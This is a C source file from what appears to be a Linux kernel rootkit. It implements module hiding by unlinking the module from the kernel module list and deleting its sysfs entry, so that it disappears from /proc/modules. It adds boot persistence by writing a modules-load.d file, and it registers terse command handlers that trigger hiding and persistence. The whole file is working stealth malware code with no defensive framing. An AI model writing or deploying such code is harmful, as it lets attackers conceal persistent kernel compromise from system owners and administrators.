// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>

/* Module hiding: remove/restore THIS_MODULE from both inventories.
 *
 * kobject_del removes the sysfs subtree. On unhide we restore the
 * module list so it appears in /proc/modules again. */

static struct list_head *saved_prev;
static struct kobject *saved_parent;

void rk_module_hide(void)
{
	if (saved_prev)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	saved_parent = THIS_MODULE->mkobj.kobj.parent;
	kobject_del(&THIS_MODULE->mkobj.kobj);
}

void rk_module_unhide(void)
{
	if (!saved_prev)
		return;
	(void)kobject_add(&THIS_MODULE->mkobj.kobj, saved_parent,
			  "%s", MODULE_NAME_STR);
	saved_parent = NULL;
	list_add(&THIS_MODULE->list, saved_prev);
	saved_prev = NULL;
}

/* Persistence: write/clear /etc/modules-load.d entry */

static int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;
	ssize_t written;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	written = kernel_write(f, MODULE_NAME_STR "\n",
			       sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	if (written < 0)
		return written;
	if (written != (ssize_t)sizeof(MODULE_NAME_STR))
		return -EIO;
	return 0;
}

static int rk_unpersist(void)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	filp_close(f, NULL);
	return 0;
}

/* Command handlers */

static int cmd_persist(const char *arg) { return rk_persist(); }
static int cmd_unpersist(const char *arg) { return rk_unpersist(); }
static int cmd_hide_module(const char *arg) { rk_module_hide(); return 0; }
static int cmd_unhide_module(const char *arg) { rk_module_unhide(); return 0; }

static const struct rk_cmd_entry module_cmds[] = {
	{ "persist",   cmd_persist },
	{ "unpersist", cmd_unpersist },
	{ "h.m",       cmd_hide_module },
	{ "u.m",       cmd_unhide_module },
};

int rk_module_cmds_init(void)
{
	return rk_cmds_register(module_cmds, ARRAY_SIZE(module_cmds));
}
